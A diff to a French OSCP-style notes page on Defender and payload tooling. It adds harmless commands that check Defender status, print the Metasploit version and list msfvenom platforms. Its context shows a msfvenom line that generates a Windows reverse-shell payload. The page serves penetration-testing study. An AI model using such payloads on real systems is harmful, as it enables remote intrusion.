@@ -143,6 +143,17 @@ if __name__ == "__main__":
 ```
 
 
+
+### Vérifier la configuration de Defender
+
+Lire l'état du moteur et les dernières mises à jour de signatures, sans désactiver la protection.
+
+<p class="oscp-command-note">Vérifier la configuration de Defender.</p>
+
+```powershell
+Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,AntivirusSignatureLastUpdated
+```
+
 ## Shellter (outil automatisé)
 
 
@@ -549,6 +560,28 @@ msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c 
 
 ```
 
+
+
+### Identifier la version de Metasploit
+
+Afficher la version du framework sans lancer de module d'exploitation.
+
+<p class="oscp-command-note">Identifier la version de Metasploit.</p>
+
+```bash
+msfconsole -q -x 'version; exit'
+```
+
+### Lister les architectures et plateformes
+
+Examiner la liste des cibles reconnues par l'installation locale de msfvenom.
+
+<p class="oscp-command-note">Lister les architectures et plateformes.</p>
+
+```bash
+msfvenom --list archs
+msfvenom --list platforms
+```
 
 ## Vérifier les formats et options de msfvenom
 
